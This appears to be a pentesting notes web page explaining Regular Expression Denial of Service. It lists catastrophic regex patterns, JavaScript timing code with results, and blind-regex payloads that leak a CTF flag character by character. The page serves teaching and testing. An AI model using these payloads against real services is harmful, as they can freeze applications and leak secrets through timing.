<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Regular expression Denial of Service - ReDoS | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-regular-expression-denial-of-service-redos/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Regular expression Denial of Service - ReDoS</h1> <p class="post-description"></p> </header> <article> <h1 id="regular-expression-denial-of-service---redos">Regular expression Denial of Service - ReDoS</h1> <h1 id="regular-expression-denial-of-service-redos">Regular Expression Denial of Service (ReDoS)</h1> <p>A <strong>Regular Expression Denial of Service (ReDoS)</strong> happens when someone takes advantage of weaknesses in how regular expressions (a way to search and match patterns in text) work. Sometimes, when regular expressions are used, they can become very slow, especially if the piece of text they’re working with gets larger. This slowness can get so bad that it grows really fast with even small increases in the text size. Attackers can use this problem to make a program that uses regular expressions stop working properly for a long time.</p> <h2 id="the-problematic-regex-naïve-algorithm">The Problematic Regex Naïve Algorithm</h2> <p><strong>Check the details in <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="external nofollow noopener" target="_blank">https://owasp.org/www-community/attacks/Regular<em>expression_Denial_of_Service</em>-_ReDoS</a></strong></p> <h2 id="evil-regexes-">Evil Regexes <a href="#evil-regexes" id="evil-regexes"></a> </h2> <p>An evil regular expression pattern is that one that can <strong>get stuck on crafted input causing a DoS</strong>. Evil regex patterns typically contain grouping with repetition and repetition or alternation with overlapping inside the repeated group. Some examples of evil patterns include:</p> <ul> <li>(a+)+</li> <li>([a-zA-Z]+)*</li> <li> <table> <tbody> <tr> <td>(a</td> <td>aa)+</td> </tr> </tbody> </table> </li> <li> <table> <tbody> <tr> <td>(a</td> <td>a?)+</td> </tr> </tbody> </table> </li> <li>(.*a){x} for x &gt; 10</li> </ul> <p>All those are vulnerable to the input <code class="language-plaintext highlighter-rouge">aaaaaaaaaaaaaaaaaaaaaaaa!</code>.</p> <h2 id="redos-payloads">ReDoS Payloads</h2> <h3 id="string-exfiltration-via-redos">String Exfiltration via ReDoS</h3> <p>In a CTF (or bug bounty) maybe you <strong>control the Regex a sensitive information (the flag) is matched with</strong>. Then, if might be useful to make the <strong>page freeze (timeout or longer processing time)</strong> if the a <strong>Regex matched</strong> and <strong>not if it didn’t</strong>. This way you will be able to <strong>exfiltrate</strong> the string <strong>char by char</strong>:</p> <ul> <li>In <a href="https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets" rel="external nofollow noopener" target="_blank"><strong>this post</strong></a> you can find this ReDoS rule: <code class="language-plaintext highlighter-rouge">^(?=&lt;flag&gt;)((.*)*)*salt$</code> <ul> <li>Example: <code class="language-plaintext highlighter-rouge">^(?=HTB{sOmE_fl§N§)((.*)*)*salt$</code> </li> </ul> </li> <li>In <a href="https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html" rel="external nofollow noopener" target="_blank"><strong>this writeup</strong></a> you can find this one:<code class="language-plaintext highlighter-rouge">&lt;flag&gt;(((((((.*)*)*)*)*)*)*)!</code> </li> <li>In <a href="https://ctftime.org/writeup/25869" rel="external nofollow noopener" target="_blank"><strong>this writeup</strong></a> he used: <code class="language-plaintext highlighter-rouge">^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$</code> </li> </ul> <h3 id="redos-controlling-input-and-regex">ReDoS Controlling Input and Regex</h3> <p>The following are <strong>ReDoS</strong> examples where you <strong>control</strong> both the <strong>input</strong> and the <strong>regex</strong>:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">check_time_regexp</span><span class="p">(</span><span class="nx">regexp</span><span class="p">,</span> <span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">t0</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="p">().</span><span class="nf">getTime</span><span class="p">();</span>
  <span class="k">new</span> <span class="nc">RegExp</span><span class="p">(</span><span class="nx">regexp</span><span class="p">).</span><span class="nf">test</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="p">().</span><span class="nf">getTime</span><span class="p">();</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Regexp </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">regexp</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> took </span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">t1</span> <span class="o">-</span> <span class="nx">t0</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> milliseconds.</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// This payloads work because the input has several "a"s</span>
<span class="p">[</span>
  <span class="c1">//  "((a+)+)+$",  //Eternal,</span>
  <span class="c1">//  "(a?){100}$", //Eternal</span>
  <span class="dl">"</span><span class="s2">(a|a?)+$</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">(</span><span class="se">\\</span><span class="s2">w*)+$</span><span class="dl">"</span><span class="p">,</span> <span class="c1">//Generic</span>
  <span class="dl">"</span><span class="s2">(a*)+$</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">(.*a){100}$</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">([a-zA-Z]+)*$</span><span class="dl">"</span><span class="p">,</span> <span class="c1">//Generic</span>
  <span class="dl">"</span><span class="s2">(a+)*$</span><span class="dl">"</span><span class="p">,</span>
<span class="p">].</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">regexp</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nf">check_time_regexp</span><span class="p">(</span><span class="nx">regexp</span><span class="p">,</span> <span class="dl">"</span><span class="s2">aaaaaaaaaaaaaaaaaaaaaaaaaa!</span><span class="dl">"</span><span class="p">));</span>

<span class="cm">/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/</span>
</code></pre></div></div> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/doyensec/regexploit" rel="external nofollow noopener" target="_blank">https://github.com/doyensec/regexploit</a></li> <li><a href="https://devina.io/redos-checker" rel="external nofollow noopener" target="_blank">https://devina.io/redos-checker</a></li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="external nofollow noopener" target="_blank">https://owasp.org/www-community/attacks/Regular<em>expression_Denial_of_Service</em>-_ReDoS</a></li> <li><a href="https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets" rel="external nofollow noopener" target="_blank">https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets</a></li> <li><a href="https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html" rel="external nofollow noopener" target="_blank">https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html</a></li> <li><a href="https://ctftime.org/writeup/25869" rel="external nofollow noopener" target="_blank">https://ctftime.org/writeup/25869</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>